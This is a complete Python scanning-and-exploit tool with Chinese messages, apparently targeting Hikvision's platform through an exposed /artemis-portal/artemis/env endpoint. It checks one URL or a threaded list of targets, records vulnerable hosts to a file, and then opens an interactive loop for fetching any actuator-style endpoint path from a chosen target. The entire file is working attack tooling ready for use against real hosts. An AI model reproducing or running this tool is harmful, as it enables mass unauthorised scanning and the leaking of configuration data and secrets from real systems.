import requests
import argparse
import sys,urllib3,json
from multiprocessing.dummy import Pool
from termcolor import colored           #导入颜色库
urllib3.disable_warnings()              #抑制警告

def banner():
    demo = """
██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                             """
    colored_demo = colored(demo, 'blue')
    print(colored_demo)

def main():
    parser = argparse.ArgumentParser(description="welcome to use!")
    parser.add_argument('-u', '--url', dest='url', type=str, help='please input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        with open(args.file, 'r', encoding='utf-8') as fp:
            url_list = [url.strip() for url in fp.readlines()]
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> or -f <file>")

def poc(target):
    payload = '/artemis-portal/artemis/env'
    try:
        res = requests.get(url=target+payload,verify=False,timeout=5)
        result = json.loads(res.text)['profiles']
        if 'prod' in result:
            print(print(f'[+]{target}存在漏洞'))
            with open('result-Hik.txt','a',encoding='utf-8')as ff:
                ff.write(f'[+]{target}存在漏洞'+'\n')
                return True
        else:
            print(f'[-]{target}不存在漏洞')
            return False
    except Exception:
        print(f"{target}该站点存在问题!")
        return False

def exp(target):
    print('-----请稍后-----')
    while True:
        print("进入命令输入循环")  # 调试信息
        api = input("请输入你要查看的接口：")
        if api =="q":
            exit()
        try:
            payload1 = f'/artemis-portal/artemis/{api}'
            res1 = requests.get(url=target+payload1,timeout=5,verify=False)
            print(res1.text)
        except:
            print("您执行的命令错误")



if __name__ =='__main__':
    main()